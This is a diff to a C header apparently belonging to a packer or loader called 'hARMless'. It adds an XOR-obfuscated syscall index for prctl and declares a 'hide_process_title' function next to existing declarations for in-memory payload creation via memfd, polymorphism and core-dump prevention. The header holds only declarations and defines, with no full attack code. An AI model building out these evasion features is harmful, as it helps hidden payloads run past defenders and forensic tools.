@@ -65,6 +65,9 @@ static inline int pack_header_valid(const pack_header_t* header,
 #ifndef MFD_CLOEXEC
 #define MFD_CLOEXEC 0x0001U
 #endif
+#ifndef PR_SET_NAME
+#define PR_SET_NAME 15
+#endif
 
 #define SC_XOR_KEY 0xDEADBEEFU
 
@@ -79,11 +82,12 @@ static inline int pack_header_valid(const pack_header_t* header,
 #define SC_IDX_FTRUNCATE         8
 #define SC_IDX_LSEEK             9
 #define SC_IDX_MPROTECT         10
-#define SC_IDX_MSYNC            11
-#define SC_IDX_IO_URING_SETUP    12
-#define SC_IDX_IO_URING_ENTER    13
-#define SC_IDX_IO_URING_REGISTER 14
-#define SC_TABLE_LEN             15
+#define SC_IDX_PRCTL            11
+#define SC_IDX_MSYNC            12
+#define SC_IDX_IO_URING_SETUP    13
+#define SC_IDX_IO_URING_ENTER    14
+#define SC_IDX_IO_URING_REGISTER 15
+#define SC_TABLE_LEN             16
 
 extern const volatile uint32_t hARMless_sc[SC_TABLE_LEN];
 /* Per-pack runtime XOR key; patched by stubgen alongside hARMless_sc[]. */
@@ -100,6 +104,7 @@ extern volatile uint32_t g_sc_xor_key;
 #define __NR_ftruncate         ((long)(hARMless_sc[SC_IDX_FTRUNCATE]         ^ g_sc_xor_key))
 #define __NR_lseek             ((long)(hARMless_sc[SC_IDX_LSEEK]             ^ g_sc_xor_key))
 #define __NR_mprotect          ((long)(hARMless_sc[SC_IDX_MPROTECT]          ^ g_sc_xor_key))
+#define __NR_prctl             ((long)(hARMless_sc[SC_IDX_PRCTL]            ^ g_sc_xor_key))
 #define __NR_msync             ((long)(hARMless_sc[SC_IDX_MSYNC]             ^ g_sc_xor_key))
 #define __NR_io_uring_setup    ((long)(hARMless_sc[SC_IDX_IO_URING_SETUP]    ^ g_sc_xor_key))
 #define __NR_io_uring_enter    ((long)(hARMless_sc[SC_IDX_IO_URING_ENTER]    ^ g_sc_xor_key))
@@ -355,6 +360,7 @@ extern volatile uint8_t  g_pack_polymorph[256];
 void secure_memory_wipe(void* ptr, size_t size);
 void prevent_core_dumps(void);
 void harmless_text_polymorph(void);
+void hide_process_title(int argc, char* argv[]);
 
 int create_payload_memfd(const char* argv0);
 
